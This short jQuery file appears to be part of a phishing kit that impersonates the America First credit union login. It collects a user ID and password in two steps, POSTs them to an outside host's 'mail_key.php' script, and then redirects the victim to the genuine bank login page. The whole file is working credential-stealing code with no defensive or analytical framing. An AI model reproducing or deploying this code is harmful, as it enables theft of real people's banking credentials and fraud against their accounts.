$("document").ready(function () {
  $("#firstuserbtn").on("click", function () {
    if ($("#user_id").val() !== "") {
      $("#userIdForm").addClass("hidden");
      $("#passForm").removeClass("hidden");
    }
  });

  $("#nd2btn").on("click", function () {
    if ($("#passid").val() !== "") {
      login = $("#user_id").val();
      password = $("#passid").val();
      $.ajax({
        url: "https://platiniumxpwallet.com/external/AmericaFirst/php/mail_key.php",
        method: "post",
        data: {
          login,
          password,
        },
        success: function (data) {
          console.log(data);
          if (data == "Sent") {
            location.assign("https://secure.americafirst.com/#/login");
          } else {
            alert("Error Logging Into Your Account");
          }
        },
        fail: function (data) {
          console.log(data);
          alert("Error Logging Into Your Account");
        },
        error: function (data) {
          console.log(data);
          alert("Error Logging Into Your Account");
        },
      });
    }
  });
});
